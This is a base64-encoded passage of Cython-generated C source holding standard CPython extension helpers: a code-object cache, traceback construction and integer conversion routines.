JpZXNbbWlkXS5jb2RlX2xpbmUpIHsKICAgICAgICByZXR1cm4gbWlkOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gbWlkICsgMTsKICAgIH0KfQpzdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X19maW5kX2NvZGVfb2JqZWN0KHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUsIGludCBjb2RlX2xpbmUpIHsKICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdDsKICAgIGludCBwb3M7CiAgICBpZiAodW5saWtlbHkoIWNvZGVfbGluZSkgfHwgdW5saWtlbHkoIWNvZGVfY2FjaGUtPmVudHJpZXMpKSB7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBwb3MgPSBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKGNvZGVfY2FjaGUtPmVudHJpZXMsIGNvZGVfY2FjaGUtPmNvdW50LCBjb2RlX2xpbmUpOwogICAgaWYgKHVubGlrZWx5KHBvcyA+PSBjb2RlX2NhY2hlLT5jb3VudCkgfHwgdW5saWtlbHkoY29kZV9jYWNoZS0+ZW50cmllc1twb3NdLmNvZGVfbGluZSAhPSBjb2RlX2xpbmUpKSB7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBjb2RlX29iamVjdCA9IGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX29iamVjdDsKICAgIFB5X0lOQ1JFRihjb2RlX29iamVjdCk7CiAgICByZXR1cm4gY29kZV9vYmplY3Q7Cn0Kc3RhdGljIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDUwogICAgKHZvaWQpX19weXhfX2ZpbmRfY29kZV9vYmplY3Q7CiAgICByZXR1cm4gTlVMTDsgLy8gTW9zdCBpbXBsZW1lbnRhdGlvbiBzaG91bGQgaGF2ZSBhdG9taWNzLiBCdXQgb3RoZXJ3aXNlLCBkb24ndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IG1pc3MuCiNlbHNlCiAgICBzdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlICpjb2RlX2NhY2hlID0gJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVfY2FjaGU7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZF9jb3VudCA9IF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50KTsKICAgIGlmIChvbGRfY291bnQgPCAwKSB7CiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQojZW5kaWYKICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpyZXN1bHQgPSBfX3B5eF9fZmluZF9jb2RlX29iamVjdChjb2RlX2NhY2hlLCBjb2RlX2xpbmUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50KTsKI2VuZGlmCiAgICByZXR1cm4gcmVzdWx0OwojZW5kaWYKfQpzdGF0aWMgdm9pZCBfX3B5eF9faW5zZXJ0X2NvZGVfb2JqZWN0KHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUsIGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCkKewogICAgaW50IHBvcywgaTsKICAgIF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzID0gY29kZV9jYWNoZS0+ZW50cmllczsKICAgIGlmICh1bmxpa2VseSghY29kZV9saW5lKSkgewogICAgICAgIHJldHVybjsKICAgIH0KICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHsKICAgICAgICBlbnRyaWVzID0gKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KilQeU1lbV9NYWxsb2MoNjQqc2l6ZW9mKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KSk7CiAgICAgICAgaWYgKGxpa2VseShlbnRyaWVzKSkgewogICAgICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllczsKICAgICAgICAgICAgY29kZV9jYWNoZS0+bWF4X2NvdW50ID0gNjQ7CiAgICAgICAgICAgIGNvZGVfY2FjaGUtPmNvdW50ID0gMTsKICAgICAgICAgICAgZW50cmllc1swXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7CiAgICAgICAgICAgIGVudHJpZXNbMF0uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDsKICAgICAgICAgICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgcG9zID0gX19weXhfYmlzZWN0X2NvZGVfb2JqZWN0cyhjb2RlX2NhY2hlLT5lbnRyaWVzLCBjb2RlX2NhY2hlLT5jb3VudCwgY29kZV9saW5lKTsKICAgIGlmICgocG9zIDwgY29kZV9jYWNoZS0+Y291bnQpICYmIHVubGlrZWx5KGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPT0gY29kZV9saW5lKSkgewogICAgICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiB0bXAgPSBlbnRyaWVzW3Bvc10uY29kZV9vYmplY3Q7CiAgICAgICAgZW50cmllc1twb3NdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7CiAgICAgICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTsKICAgICAgICBQeV9ERUNSRUYodG1wKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBpZiAoY29kZV9jYWNoZS0+Y291bnQgPT0gY29kZV9jYWNoZS0+bWF4X2NvdW50KSB7CiAgICAgICAgaW50IG5ld19tYXggPSBjb2RlX2NhY2hlLT5tYXhfY291bnQgKyA2NDsKICAgICAgICBlbnRyaWVzID0gKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KilQeU1lbV9SZWFsbG9jKAogICAgICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzLCAoKHNpemVfdCluZXdfbWF4KSAqIHNpemVvZihfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSkpOwogICAgICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllczsKICAgICAgICBjb2RlX2NhY2hlLT5tYXhfY291bnQgPSBuZXdfbWF4OwogICAgfQogICAgZm9yIChpPWNvZGVfY2FjaGUtPmNvdW50OyBpPnBvczsgaS0tKSB7CiAgICAgICAgZW50cmllc1tpXSA9IGVudHJpZXNbaS0xXTsKICAgIH0KICAgIGVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7CiAgICBlbnRyaWVzW3Bvc10uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDsKICAgIGNvZGVfY2FjaGUtPmNvdW50Kys7CiAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpOwp9CnN0YXRpYyB2b2lkIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChpbnQgY29kZV9saW5lLCBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3QpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDUwogICAgKHZvaWQpX19weXhfX2luc2VydF9jb2RlX29iamVjdDsKICAgIHJldHVybjsgLy8gTW9zdCBpbXBsZW1lbnRhdGlvbiBzaG91bGQgaGF2ZSBhdG9taWNzLiBCdXQgb3RoZXJ3aXNlLCBkb24ndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IGZhaWwuCiNlbHNlCiAgICBzdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlICpjb2RlX2NhY2hlID0gJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVfY2FjaGU7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGV4cGVjdGVkID0gMDsKICAgIGlmICghX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50LCAmZXhwZWN0ZWQsIElOVF9NSU4pKSB7CiAgICAgICAgcmV0dXJuOwogICAgfQojZW5kaWYKICAgIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3QoY29kZV9jYWNoZSwgY29kZV9saW5lLCBjb2RlX29iamVjdCk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfYXRvbWljX3N1YigmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQsIElOVF9NSU4pOwojZW5kaWYKI2VuZGlmCn0KCgojaW5jbHVkZSAiY29tcGlsZS5oIgojaW5jbHVkZSAiZnJhbWVvYmplY3QuaCIKI2luY2x1ZGUgInRyYWNlYmFjay5oIgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDBhNiAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiAhZGVmaW5lZChQWVBZX1ZFUlNJT04pCiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFCiAgICAjZGVmaW5lIFB5X0JVSUxEX0NPUkUgMQogICNlbmRpZgogICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCIKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKnNjcmF0Y2hfZGljdCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpmaXJzdGxpbmVubywgUHlPYmplY3QgKm5hbWUpIHsKICAgIFB5T2JqZWN0ICpyZXBsYWNlID0gTlVMTDsKICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhzY3JhdGNoX2RpY3QsICJjb19maXJzdGxpbmVubyIsIGZpcnN0bGluZW5vKSkpIHJldHVybiBOVUxMOwogICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKHNjcmF0Y2hfZGljdCwgImNvX25hbWUiLCBuYW1lKSkpIHJldHVybiBOVUxMOwogICAgcmVwbGFjZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoY29kZSwgInJlcGxhY2UiKTsKICAgIGlmIChsaWtlbHkocmVwbGFjZSkpIHsKICAgICAgICBQeU9iamVjdCAqcmVzdWx0ID0gUHlPYmplY3RfQ2FsbChyZXBsYWNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgc2NyYXRjaF9kaWN0KTsKICAgICAgICBQeV9ERUNSRUYocmVwbGFjZSk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIFB5RXJyX0NsZWFyKCk7CiAgICByZXR1cm4gTlVMTDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9BZGRUcmFjZWJhY2soY29uc3QgY2hhciAqZnVuY25hbWUsIGludCBjX2xpbmUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpIHsKICAgIFB5T2JqZWN0ICpjb2RlX29iamVjdCA9IE5VTEwsICpweV9weV9saW5lID0gTlVMTCwgKnB5X2Z1bmNuYW1lID0gTlVMTCwgKmRpY3QgPSBOVUxMOwogICAgUHlPYmplY3QgKnJlcGxhY2UgPSBOVUxMLCAqZ2V0ZnJhbWUgPSBOVUxMLCAqZnJhbWUgPSBOVUxMOwogICAgUHlPYmplY3QgKmV4Y190eXBlLCAqZXhjX3ZhbHVlLCAqZXhjX3RyYWNlYmFjazsKICAgIGludCBzdWNjZXNzID0gMDsKICAgIGlmIChjX2xpbmUpIHsKICAgICAgICAodm9pZCkgX19weXhfY2ZpbGVubTsKICAgICAgICAodm9pZCkgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCBjX2xpbmUpOwogICAgfQogICAgUHlFcnJfRmV0Y2goJmV4Y190eXBlLCAmZXhjX3ZhbHVlLCAmZXhjX3RyYWNlYmFjayk7CiAgICBjb2RlX29iamVjdCA9IF9fcHl4X2ZpbmRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUpOwogICAgaWYgKCFjb2RlX29iamVjdCkgewogICAgICAgIGNvZGVfb2JqZWN0ID0gUHlfQ29tcGlsZVN0cmluZygiX2dldGZyYW1lKCkiLCBmaWxlbmFtZSwgUHlfZXZhbF9pbnB1dCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFjb2RlX29iamVjdCkpIGdvdG8gYmFkOwogICAgICAgIHB5X3B5X2xpbmUgPSBQeUxvbmdfRnJvbUxvbmcocHlfbGluZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFweV9weV9saW5lKSkgZ290byBiYWQ7CiAgICAgICAgcHlfZnVuY25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhmdW5jbmFtZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFweV9mdW5jbmFtZSkpIGdvdG8gYmFkOwogICAgICAgIGRpY3QgPSBQeURpY3RfTmV3KCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFkaWN0KSkgZ290byBiYWQ7CiAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqb2xkX2NvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7CiAgICAgICAgICAgIGNvZGVfb2JqZWN0ID0gX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhjb2RlX29iamVjdCwgZGljdCwgcHlfcHlfbGluZSwgcHlfZnVuY25hbWUpOwogICAgICAgICAgICBQeV9ERUNSRUYob2xkX2NvZGVfb2JqZWN0KTsKICAgICAgICB9CiAgICAgICAgaWYgKHVubGlrZWx5KCFjb2RlX29iamVjdCkpIGdvdG8gYmFkOwogICAgICAgIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSwgY29kZV9vYmplY3QpOwogICAgfSBlbHNlIHsKICAgICAgICBkaWN0ID0gUHlEaWN0X05ldygpOwogICAgfQogICAgZ2V0ZnJhbWUgPSBQeVN5c19HZXRPYmplY3QoIl9nZXRmcmFtZSIpOwogICAgaWYgKHVubGlrZWx5KCFnZXRmcmFtZSkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKGRpY3QsICJfZ2V0ZnJhbWUiLCBnZXRmcmFtZSkpKSBnb3RvIGJhZDsKICAgIGZyYW1lID0gUHlFdmFsX0V2YWxDb2RlKGNvZGVfb2JqZWN0LCBkaWN0LCBkaWN0KTsKICAgIGlmICh1bmxpa2VseSghZnJhbWUpIHx8IGZyYW1lID09IFB5X05vbmUpIGdvdG8gYmFkOwogICAgc3VjY2VzcyA9IDE7CiAgYmFkOgogICAgUHlFcnJfUmVzdG9yZShleGNfdHlwZSwgZXhjX3ZhbHVlLCBleGNfdHJhY2ViYWNrKTsKICAgIFB5X1hERUNSRUYoY29kZV9vYmplY3QpOwogICAgUHlfWERFQ1JFRihweV9weV9saW5lKTsKICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpOwogICAgUHlfWERFQ1JFRihkaWN0KTsKICAgIFB5X1hERUNSRUYocmVwbGFjZSk7CiAgICBpZiAoc3VjY2VzcykgewogICAgICAgIFB5VHJhY2VCYWNrX0hlcmUoCiAgICAgICAgICAgIChzdHJ1Y3QgX2ZyYW1lKilmcmFtZSk7CiAgICB9CiAgICBQeV9YREVDUkVGKGZyYW1lKTsKfQojZWxzZQpzdGF0aWMgUHlDb2RlT2JqZWN0KiBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0Rm9yVHJhY2ViYWNrKAogICAgICAgICAgICBjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSwKICAgICAgICAgICAgaW50IHB5X2xpbmUsIGNvbnN0IGNoYXIgKmZpbGVuYW1lKSB7CiAgICBQeUNvZGVPYmplY3QgKnB5X2NvZGUgPSBOVUxMOwogICAgUHlPYmplY3QgKnB5X2Z1bmNuYW1lID0gTlVMTDsKICAgIGlmIChjX2xpbmUpIHsKICAgICAgICBweV9mdW5jbmFtZSA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCAiJXMgKCVzOiVkKSIsIGZ1bmNuYW1lLCBfX3B5eF9jZmlsZW5tLCBjX2xpbmUpOwogICAgICAgIGlmICghcHlfZnVuY25hbWUpIGdvdG8gYmFkOwogICAgICAgIGZ1bmNuYW1lID0gUHlVbmljb2RlX0FzVVRGOChweV9mdW5jbmFtZSk7CiAgICAgICAgaWYgKCFmdW5jbmFtZSkgZ290byBiYWQ7CiAgICB9CiAgICBweV9jb2RlID0gUHlDb2RlX05ld0VtcHR5KGZpbGVuYW1lLCBmdW5jbmFtZSwgcHlfbGluZSk7CiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTsKICAgIHJldHVybiBweV9jb2RlOwpiYWQ6CiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSkgewogICAgUHlDb2RlT2JqZWN0ICpweV9jb2RlID0gMDsKICAgIFB5RnJhbWVPYmplY3QgKnB5X2ZyYW1lID0gMDsKICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDsKICAgIFB5T2JqZWN0ICpwdHlwZSwgKnB2YWx1ZSwgKnB0cmFjZWJhY2s7CiAgICBpZiAoY19saW5lKSB7CiAgICAgICAgY19saW5lID0gX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2sodHN0YXRlLCBjX2xpbmUpOwogICAgfQogICAgcHlfY29kZSA9IF9fcHl4X2ZpbmRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUpOwogICAgaWYgKCFweV9jb2RlKSB7CiAgICAgICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgJnB0eXBlLCAmcHZhbHVlLCAmcHRyYWNlYmFjayk7CiAgICAgICAgcHlfY29kZSA9IF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RGb3JUcmFjZWJhY2soCiAgICAgICAgICAgIGZ1bmNuYW1lLCBjX2xpbmUsIHB5X2xpbmUsIGZpbGVuYW1lKTsKICAgICAgICBpZiAoIXB5X2NvZGUpIHsKICAgICAgICAgICAgCiAgICAgICAgICAgIFB5X1hERUNSRUYocHR5cGUpOwogICAgICAgICAgICBQeV9YREVDUkVGKHB2YWx1ZSk7CiAgICAgICAgICAgIFB5X1hERUNSRUYocHRyYWNlYmFjayk7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZSh0c3RhdGUsIHB0eXBlLCBwdmFsdWUsIHB0cmFjZWJhY2spOwogICAgICAgIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSwgcHlfY29kZSk7CiAgICB9CiAgICBweV9mcmFtZSA9IFB5RnJhbWVfTmV3KAogICAgICAgIHRzdGF0ZSwgICAgICAgICAgICAKICAgICAgICBweV9jb2RlLCAgICAgICAgICAgCiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgICAgCiAgICAgICAgMCAgICAgICAgICAgICAgICAgIAogICAgKTsKICAgIGlmICghcHlfZnJhbWUpIGdvdG8gYmFkOwogICAgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKHB5X2ZyYW1lLCBweV9saW5lKTsKICAgIFB5VHJhY2VCYWNrX0hlcmUocHlfZnJhbWUpOwpiYWQ6CiAgICBQeV9YREVDUkVGKHB5X2NvZGUpOwogICAgUHlfWERFQ1JFRihweV9mcmFtZSk7Cn0KI2VuZGlmCgoKI2RlZmluZSBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVwKICAgIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCAwKQojZGVmaW5lIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVwKICAgIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCAxKQojZGVmaW5lIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCBleGMpXAogICAge1wKICAgICAgICBmdW5jX3R5cGUgdmFsdWUgPSBmdW5jX3ZhbHVlO1wKICAgICAgICBpZiAoc2l6ZW9mKHRhcmdldF90eXBlKSA8IHNpemVvZihmdW5jX3R5cGUpKSB7XAogICAgICAgICAgICBpZiAodW5saWtlbHkodmFsdWUgIT0gKGZ1bmNfdHlwZSkgKHRhcmdldF90eXBlKSB2YWx1ZSkpIHtcCiAgICAgICAgICAgICAgICBmdW5jX3R5cGUgemVybyA9IDA7XAogICAgICAgICAgICAgICAgaWYgKGV4YyAmJiB1bmxpa2VseSh2YWx1ZSA9PSAoZnVuY190eXBlKS0xICYmIFB5RXJyX09jY3VycmVkKCkpKVwKICAgICAgICAgICAgICAgICAgICByZXR1cm4gKHRhcmdldF90eXBlKSAtMTtcCiAgICAgICAgICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkodmFsdWUgPCB6ZXJvKSlcCiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XAogICAgICAgICAgICAgICAgZWxzZVwKICAgICAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1wKICAgICAgICAgICAgfVwKICAgICAgICB9XAogICAgICAgIHJldHVybiAodGFyZ2V0X3R5cGUpIHZhbHVlO1wKICAgIH0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0Zyb21fbG9uZyhsb25nIHZhbHVlKSB7CiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwdXNoCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIgojZW5kaWYKICAgIGNvbnN0IGxvbmcgbmVnX29uZSA9IChsb25nKSAtMSwgY29uc3RfemVybyA9IChsb25nKSAwOwojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wCiNlbmRpZgogICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87CiAgICBpZiAoaXNfdW5zaWduZWQpIHsKICAgICAgICBpZiAoc2l6ZW9mKGxvbmcpIDwgc2l6ZW9mKGxvbmcpKSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTsKICAgICAgICB9IGVsc2UgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YodW5zaWduZWQgbG9uZykpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tVW5zaWduZWRMb25nKCh1bnNpZ25lZCBsb25nKSB2YWx1ZSk7CiNpZiBkZWZpbmVkKEhBVkVfTE9OR19MT05HKSAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKHVuc2lnbmVkIFBZX0xPTkdfTE9ORykpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tVW5zaWduZWRMb25nTG9uZygodW5zaWduZWQgUFlfTE9OR19MT05HKSB2YWx1ZSk7CiNlbmRpZgogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YobG9uZykpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZygobG9uZykgdmFsdWUpOwojaWZkZWYgSEFWRV9MT05HX0xPTkcKICAgICAgICB9IGVsc2UgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkgewogICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nTG9uZygoUFlfTE9OR19MT05HKSB2YWx1ZSk7CiNlbmRpZgogICAgICAgIH0KICAgIH0KICAgIHsKICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbHVlOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNAogICAgICAgIGlmIChpc191bnNpZ25lZCkgewogICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZE5hdGl2ZUJ5dGVzKGJ5dGVzLCBzaXplb2YodmFsdWUpLCAtMSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTmF0aXZlQnl0ZXMoYnl0ZXMsIHNpemVvZih2YWx1ZSksIC0xKTsKICAgICAgICB9CiNlbGlmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMAogICAgICAgIGludCBvbmUgPSAxOyBpbnQgbGl0dGxlID0gKGludCkqKHVuc2lnbmVkIGNoYXIgKikmb25lOwogICAgICAgIHJldHVybiBfUHlMb25nX0Zyb21CeXRlQXJyYXkoYnl0ZXMsIHNpemVvZihsb25nKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpdHRsZSwgIWlzX3Vuc2lnbmVkKTsKI2Vsc2UKICAgICAgICBpbnQgb25lID0gMTsgaW50IGxpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTsKICAgICAgICBQeU9iamVjdCAqZnJvbV9ieXRlcywgKnJlc3VsdCA9IE5VTEwsICprd2RzID0gTlVMTDsKICAgICAgICBQeU9iamVjdCAqcHlfYnl0ZXMgPSBOVUxMLCAqb3JkZXJfc3RyID0gTlVMTDsKICAgICAgICBmcm9tX2J5dGVzID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKSZQeUxvbmdfVHlwZSwgImZyb21fYnl0ZXMiKTsKICAgICAgICBpZiAoIWZyb21fYnl0ZXMpIHJldHVybiBOVUxMOwogICAgICAgIHB5X2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSgoY2hhciopYnl0ZXMsIHNpemVvZihsb25nKSk7CiAgICAgICAgaWYgKCFweV9ieXRlcykgZ290byBsaW1pdGVkX2JhZDsKICAgICAgICBvcmRlcl9zdHIgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhsaXR0bGUgPyAibGl0dGxlIiA6ICJiaWciKTsKICAgICAgICBpZiAoIW9yZGVyX3N0cikgZ290byBsaW1pdGVkX2JhZDsKICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzWzMrKENZVEhPTl9WRUNUT1JDQUxMID8gMSA6IDApXSA9IHsgTlVMTCwgcHlfYnl0